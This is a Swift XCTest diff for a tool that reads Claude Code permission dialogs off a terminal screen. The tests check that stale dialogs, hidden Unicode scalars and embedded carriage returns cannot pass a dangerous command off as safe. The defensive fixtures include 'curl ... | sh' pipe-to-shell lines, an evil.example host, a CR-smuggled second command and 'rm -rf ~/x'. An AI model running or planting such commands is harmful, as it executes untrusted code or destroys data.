@@ -713,7 +713,7 @@ final class AgentIslandPromptTests: XCTestCase {
             let p = try prompt(screen)
             XCTAssertFalse(p.topFound, why)
             XCTAssertEqual(p.options.map { p.isEnabled($0) }, enabled, why)
-            XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.tooLongCaption, why)
+            XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.offTopCaption, why)
             let f = FakeDch()
             f.screen = screen
             XCTAssertEqual(f.answer(1, expected: p), .changed, why)
@@ -734,7 +734,7 @@ final class AgentIslandPromptTests: XCTestCase {
         XCTAssertFalse(p.layout.context.count > AgentPrompt.maxContext, "not over the row cap")
         XCTAssertFalse(p.topFound)
         XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true])
-        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.tooLongCaption)
+        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.offTopCaption)
         let f = FakeDch()
         f.screen = screen
         XCTAssertEqual(f.answer(1, expected: p), .changed)
@@ -846,5 +846,289 @@ final class AgentIslandPromptTests: XCTestCase {
             try png.write(to: out.appendingPathComponent("\(name).png"))
             if let extra { try png.write(to: extra.appendingPathComponent("\(name).png")) }
         }
+    }
+
+    // MARK: - #483 item 1: only a dialog at the bottom of the screen is live
+
+    /// QA #301 L2: an old dialog printed above a shell prompt (dch reads blocked on
+    /// its quoted footer). A click would type a digit into the shell.
+    func testStaticCopyOfADialogAboveAShellPromptIsNotActionable() throws {
+        let live = bash21(["echo safe"]), rule = String(repeating: "─", count: 90)
+        let p = try prompt(live)
+        for (why, screen) in [("footer, then a prompt", live + "\nuser@host proj % "),
+                              ("blank line, then output", live + "\n\nls: done\n"),
+                              ("Claude's idle input box", live + "\n" + rule + "\n❯ \n" + rule + "\n  ? for shortcuts"),
+                              ("no footer, a prompt after a blank", bashScreen + "\n\n$ "),
+                              ("no footer, a prompt right under the last option", bashScreen + "\nuser@host proj % "),
+                              ("1.x box, then a prompt", boxedScreen + "\n$ ")] {
+            XCTAssertNil(AgentPrompt.parse(screen), why)
+            if case .prompt = AgentPrompt.card(screen: screen) { XCTFail("an actionable card: \(why)") }
+            let f = FakeDch()
+            f.screen = screen
+            XCTAssertEqual(f.answer(1, expected: p), .changed, why)
+            XCTAssertEqual(f.answer(3, expected: p), .changed, why)
+            XCTAssertEqual(f.sent, [], why)
+        }
+        // Still live: trailing blanks, a closing rule, a wrapped last option over its footer.
+        XCTAssertEqual(try prompt(live + "\n\n   \n"), p)
+        XCTAssertNotNil(AgentPrompt.parse(bashScreen + "\n" + rule + "\n"))
+        let wrapped = live.replacingOccurrences(of: "   3. No", with: "   3. No, and tell Claude what to do\n      differently")
+        XCTAssertEqual(try prompt(wrapped).options[2].detail, ["differently"])
+        XCTAssertNil(AgentPrompt.parse(wrapped.replacingOccurrences(of: " Esc to cancel · Tab to amend", with: "")),
+                     "a last option's detail with nothing under it could be a shell prompt")
+    }
+
+    // MARK: - #483 item 2: hidden scalars by Unicode property
+
+    func testIsHiddenKeepsEveryOldRangeAndCatchesTheMissedScalars() {
+        let old: [ClosedRange<UInt32>] = [0x00...0x1F, 0x7F...0x9F, 0xAD...0xAD, 0x61C...0x61C, 0x200B...0x200F,
+                                          0x2028...0x2029, 0x202A...0x202E, 0x2060...0x2064, 0x2066...0x2069, 0xFEFF...0xFEFF]
+        let missed: [ClosedRange<UInt32>] = [0x34F...0x34F, 0x115F...0x1160, 0x3164...0x3164, 0xFFA0...0xFFA0,
+                                             0x17B4...0x17B5, 0x2065...0x2065, 0x206A...0x206F, 0xFFF9...0xFFFB,
+                                             0x1D173...0x1D17A, 0xE0001...0xE007F, 0x1BCA0...0x1BCA0]
+        for (what, ranges) in [("old", old), ("missed", missed)] {
+            for v in ranges.joined() {
+                XCTAssertTrue(AgentPrompt.isHidden(Unicode.Scalar(v)!), "\(what) U+\(String(format: "%04X", v))")
+            }
+        }
+        for v: UInt32 in 0xFE00...0xFE0F { XCTAssertFalse(AgentPrompt.isHidden(Unicode.Scalar(v)!), "VS U+\(String(v, radix: 16))") }
+        for c in "a ~漢😀é\u{301}─│❯✔" { XCTAssertFalse(c.unicodeScalars.contains(where: AgentPrompt.isHidden), "\(c)") }
+    }
+
+    func testMissedScalarInACommandIsDenyOnlyAndEmojiStayApprovable() throws {
+        for v: UInt32 in [0x3164, 0x34F, 0xE0041, 0x1D173] {
+            let s = "echo a\(Character(Unicode.Scalar(v)!))b"
+            let p = try prompt(bash21([s]))
+            XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true], s)
+            XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.hiddenCaption, s)
+            XCTAssertEqual(p.layout.context, ["echo a⟨U+\(String(format: "%04X", v))⟩b"])
+        }
+        // U+FE0F (emoji presentation) renders literally and stays approvable.
+        let emoji = try prompt(bash21(["echo ❤️ ✔️ done"], allow: "/Users/probe/☕️"))
+        XCTAssertFalse(emoji.hasHiddenCharacters)
+        XCTAssertEqual(emoji.options.map { emoji.isEnabled($0) }, [true, true, true])
+        XCTAssertEqual(emoji.layout.caption, [])
+        // A ZWJ sequence stays hidden (as before #483): U+200D can glue anything.
+        let zwj = try prompt(bash21(["echo 👨‍👩‍👧"]))
+        XCTAssertTrue(zwj.hasHiddenCharacters)
+        XCTAssertEqual(zwj.options.map { zwj.isEnabled($0) }, [false, false, true])
+    }
+
+    // MARK: - #483 item 3: blank lines inside a command
+
+    func testBlankLinesInsideACommandAreShownAndCompared() throws {
+        let heredoc = ["cat > run.sh <<'EOF'", "echo one", "", "echo two", "EOF"]
+        let p = try prompt(bash21(heredoc))
+        XCTAssertEqual(p.context, heredoc)
+        XCTAssertEqual(p.layout.context, heredoc, "shown as an empty row")
+        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, true, true])
+        let f = FakeDch()
+        for (why, command) in [("blank removed", ["cat > run.sh <<'EOF'", "echo one", "echo two", "EOF"]),
+                               ("blank doubled", ["cat > run.sh <<'EOF'", "echo one", "", "", "echo two", "EOF"]),
+                               ("blank moved", ["cat > run.sh <<'EOF'", "", "echo one", "echo two", "EOF"])] {
+            f.screen = bash21(command)
+            XCTAssertEqual(f.answer(1, expected: p), .changed, why)
+        }
+        f.screen = bash21(heredoc)
+        XCTAssertEqual(f.answer(1, expected: p), .sent)
+        XCTAssertEqual(f.sent, ["1"])
+
+        // The dialog's own section blanks stay dropped: header, command, description, question.
+        let sections = """
+        ──────────────────────────────────────────────────────────────────────────────────────────
+         Bash command
+
+           cat <<'EOF'
+           a
+
+           b
+           EOF
+           Print two lines
+
+         Do you want to proceed?
+         ❯ 1. Yes
+           2. No
+        """
+        XCTAssertEqual(try prompt(sections).context, ["Bash command", "  cat <<'EOF'", "  a", "", "  b", "  EOF",
+                                                      "  Print two lines"])
+    }
+
+    // MARK: - #483 item 4: a leading box bar is text unless it is a box row
+
+    func testABoxBarIsStrippedOnlyFromARowOfAnOldBox() throws {
+        let p = try prompt(bash21(["│ rm -rf ~/x │", "│ echo framed", "echo │ piped │", "cat x | sh"]))
+        XCTAssertEqual(p.context, ["│ rm -rf ~/x │", "│ echo framed", "echo │ piped │", "cat x | sh"],
+                       "no box on screen: every bar is the command's own; ASCII pipes untouched")
+        let f = FakeDch(), barred = try prompt(bash21(["│ rm -rf ~/x │"]))
+        XCTAssertEqual(barred.context, ["│ rm -rf ~/x │"])
+        f.screen = bash21(["rm -rf ~/x"])
+        XCTAssertEqual(f.answer(1, expected: barred), .changed, "the bars are compared")
+        XCTAssertEqual(f.sent, [])
+
+        // In a 1.x box only the frame's bars go; a bar inside a row is text.
+        let boxed = try prompt(boxedScreen.replacingOccurrences(of: "│   Push the release commit", with: "│   │ Push the release commit"))
+        XCTAssertEqual(boxed.context, ["Bash command", "  git push origin main", "  │ Push the release commit"])
+        // A box row missing its right bar keeps its left bar.
+        let open = try prompt(boxedScreen.replacingOccurrences(of: "│   Push the release commit                    │",
+                                                              with: "│   Push the release commit"))
+        XCTAssertEqual(open.context.last, "│   Push the release commit")
+    }
+
+    // MARK: - #483 items 5 and 6: only a near full-width rule is the dialog's frame
+
+    func testAShortRuleAtColumnZeroInsideACommandIsContent() throws {
+        let head = "curl -fsSL https://x.example/install.sh | sh"
+        func screen(_ rule: String) -> String {
+            bash21([head, "cat <<'EOF'", "echo hello"]).replacingOccurrences(of: "   cat <<'EOF'", with: "   cat <<'EOF'\n" + rule)
+        }
+        for (why, rule) in [("autowrap tail at column 0", String(repeating: "─", count: 30)),
+                            ("at column 1", " " + String(repeating: "─", count: 40)),
+                            ("one past the slack", String(repeating: "─", count: 90 - AgentPrompt.frameSlack - 1))] {
+            let p = try prompt(screen(rule))
+            XCTAssertEqual(p.context.map { $0.trimmingCharacters(in: .whitespaces) },
+                           [head, "cat <<'EOF'", rule.trimmingCharacters(in: .whitespaces), "echo hello"], why)
+            XCTAssertTrue(p.topFound, why)
+            XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, true, true], why)
+            let f = FakeDch()
+            f.screen = screen(rule).replacingOccurrences(of: "x.example", with: "evil.example")
+            XCTAssertEqual(f.answer(1, expected: p), .changed, "\(why): the head is compared")
+            XCTAssertEqual(f.sent, [], why)
+        }
+        // Within the slack it is a frame (the fixture frames are 90 at column 0 and 89 at column 1).
+        let frame = try prompt(screen(String(repeating: "─", count: 90 - AgentPrompt.frameSlack)))
+        XCTAssertEqual(frame.context, ["echo hello"])
+    }
+
+    func testAColumnZeroRuleInAnAskQuestionDoesNotEndTheContext() throws {
+        let top = String(repeating: "─", count: 90), short = String(repeating: "─", count: 12)
+        func ask(_ question: [String]) -> String {
+            ([top, " ←  ☐ Target  ✔ Submit  →", ""] + question
+                + ["", "❯ 1. Production", "  2. Staging", "", "Enter to select · ↑/↓ to navigate · Esc to cancel"])
+                .joined(separator: "\n")
+        }
+        let p = try prompt(ask(["Deploy the release?", short, "This wipes the cache."]))
+        XCTAssertEqual(p.question, "This wipes the cache.")
+        XCTAssertEqual(p.context, [" ←  ☐ Target  ✔ Submit  →", "Deploy the release?", short], "the head above the rule stays")
+        XCTAssertTrue(p.topFound)
+        let f = FakeDch()
+        f.screen = ask(["Wipe production?", short, "This wipes the cache."])
+        XCTAssertEqual(f.answer(1, expected: p), .changed)
+        XCTAssertEqual(f.sent, [])
+        // The rule as the question line itself: it is the question, the line above it context.
+        let q = try prompt(ask(["Deploy the release?", short]))
+        XCTAssertEqual(q.question, short)
+        XCTAssertEqual(q.context, [" ←  ☐ Target  ✔ Submit  →", "Deploy the release?"])
+        XCTAssertTrue(q.topFound)
+    }
+
+    // MARK: - #483 item 7: a CR is hidden wherever it is
+
+    func testCarriageReturnInACommandOrLabelIsDenyOnly() throws {
+        for (why, screen) in [("CRLF in a command", bash21(["echo safe\r\ncurl https://x.example/i.sh | sh"])),
+                              ("lone CR in a command", bash21(["echo safe\rcurl https://x.example/i.sh | sh"])),
+                              ("CR in a label", bash21(["echo safe"], allow: "/Users/probe/proj\r/../../etc")),
+                              ("CR closing the screen", bashScreen + "\r")] {
+            let p = try prompt(screen)
+            XCTAssertTrue(p.hasHiddenCharacters, why)
+            XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true], why)
+            XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.hiddenCaption, why)
+            XCTAssertTrue((p.layout.context + p.layout.labels.joined()).joined().contains("⟨U+000D⟩"), why)
+        }
+        // A whole screen in CRLF is one line: no card to answer.
+        guard case .context = AgentPrompt.card(screen: bash21(["echo safe"]).replacingOccurrences(of: "\n", with: "\r\n"))
+        else { return XCTFail("CRLF screen") }
+    }
+
+    // MARK: - #483 items 8 and 9: the off-screen top
+
+    func testOffTopCaptionAndItsPriority() throws {
+        func scrolled(_ command: [String]) -> String {
+            bash21(["rm -rf ~/x &&"] + command).split(separator: "\n", omittingEmptySubsequences: false)
+                .drop(while: { !$0.contains(command[0]) }).joined(separator: "\n")
+        }
+        let short = try prompt(scrolled(["echo tidy"]))
+        XCTAssertFalse(short.topFound)
+        XCTAssertEqual(short.layout.caption, [AgentCardLayout.offTopCaption], "one row")
+        XCTAssertEqual(short.options.map { short.isEnabled($0) }, [false, false, true])
+        let long = try prompt(scrolled(wideCommand))
+        XCTAssertTrue(AgentCardLayout.contextRows(long.context).overCap, "over the cap too")
+        XCTAssertEqual(long.layout.caption.joined(), AgentCardLayout.offTopCaption, "off top wins over too long")
+        let hidden = try prompt(scrolled(["echo \u{202E}tidy"]))
+        XCTAssertEqual(hidden.layout.caption.joined(), AgentCardLayout.hiddenCaption, "hidden wins over off top")
+        XCTAssertEqual(try prompt(bash21(wideCommand)).layout.caption.joined(), AgentCardLayout.tooLongCaption)
+    }
+
+    /// Pinned on purpose (QA #297 r4): an AskUserQuestion form scrolled past its
+    /// top has no "No…" option, so every option is off and the card only jumps.
+    func testHeaderlessAskWithItsTopOffScreenHasEveryOptionOff() throws {
+        let screen = askFourScreen.split(separator: "\n", omittingEmptySubsequences: false)
+            .drop(while: { !$0.hasPrefix("Which deployment") }).joined(separator: "\n")
+        let p = try prompt(screen)
+        XCTAssertEqual(p.question, "Which deployment target?")
+        XCTAssertEqual(p.context, [])
+        XCTAssertFalse(p.topFound)
+        XCTAssertFalse(p.options.contains { $0.style(first: false) == .deny })
+        XCTAssertEqual(p.options.map { p.isEnabled($0) }, Array(repeating: false, count: 6))
+        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.offTopCaption)
+        let f = FakeDch()
+        f.screen = screen
+        for d in 1...6 { XCTAssertEqual(f.answer(d, expected: p), .changed, "\(d)") }
+        XCTAssertEqual(f.sent, [])
+    }
+
+    // MARK: - #483 item 10: the card draws each text with the font it measured it with
+
+    private struct Drawn: Hashable { let text: String; let font: ObjectIdentifier }
+
+    /// Renders each card offscreen (no window) with a hook on the card's one Text
+    /// constructor: every row the layout measured is drawn, with the CTFont it
+    /// was measured with (Q18b: a site drawing with another font drops out).
+    @MainActor
+    func testRendersEveryCardTextWithItsMeasuringFont() throws {
+        var drawn: Set<Drawn> = []
+        AgentPromptCardView.textHook = { drawn.insert(Drawn(text: $0, font: ObjectIdentifier($1))) }
+        defer { AgentPromptCardView.textHook = nil }
+        func draw(_ card: AgentCard) throws {
+            drawn = []
+            let r = ImageRenderer(content: AgentPromptCardView(card: card).frame(width: G.cardInner + 2 * G.cardPad))
+            _ = try XCTUnwrap(r.cgImage)
+        }
+        func expect(_ rows: [String], _ f: CTFont, _ what: String) {
+            for r in rows { XCTAssertTrue(drawn.contains(Drawn(text: r, font: ObjectIdentifier(f))), "\(what): \(r)") }
+        }
+        let screens = [bashScreen, askFourScreen, bash21(longCommand), bash21([longLine, cjkLine]),
+                       bash21(["echo safe"], allow: wideAllow), bash21(["swift build"], allow: "/Users/probe/", wrap: "proj"),
+                       hiddenScreen, editScreen]
+        for screen in screens {
+            let p = try prompt(screen), l = p.layout
+            try draw(.prompt(p))
+            expect(l.question + l.caption, G.questionFont, "question/caption")
+            expect(l.context, G.contextFont, "context")
+            expect(l.labels.joined().map { $0 }, G.labelFont, "label")
+            expect(l.details.joined().map { $0 }, G.detailFont, "detail")
+            expect(p.options.map { "\($0.digit)" }, G.digitFont, "digit")
+            expect(p.options.compactMap(\.hint), G.hintFont, "hint")
+            expect([AgentPromptCardView.jumpText], G.labelFont, "jump")
+        }
+        let lines = AgentPrompt.tail(codexScreen)
+        try draw(.context(lines))
+        expect(AgentCardLayout.contextRows(lines).rows, G.contextFont, "context-only card")
+        try draw(.changed)
+        expect([AgentPromptCardView.changedText], G.questionFont, "changed")
+    }
+
+    // MARK: - #483 item 11: a cache test that needs no other test
+
+    /// Q16: layouts keyed on less than the whole prompt (the question) would hand
+    /// one command's layout to another. Own cache, own counter.
+    func testPromptsSharingAQuestionGetTheirOwnLayouts() throws {
+        let c = AgentCardLayoutCache()
+        let a = try prompt(bash21(["echo safe"])), b = try prompt(bash21(["rm -rf ~/x"]))
+        XCTAssertEqual(a.question, b.question)
+        XCTAssertEqual(a.layout(in: c).context, ["echo safe"])
+        XCTAssertEqual(b.layout(in: c).context, ["rm -rf ~/x"])
+        XCTAssertEqual(c.builds, 4, "two layouts and two context-row sets, none shared")
+        XCTAssertEqual(a.layout(in: c).context, ["echo safe"])
+        XCTAssertEqual(c.builds, 4)
     }
 }
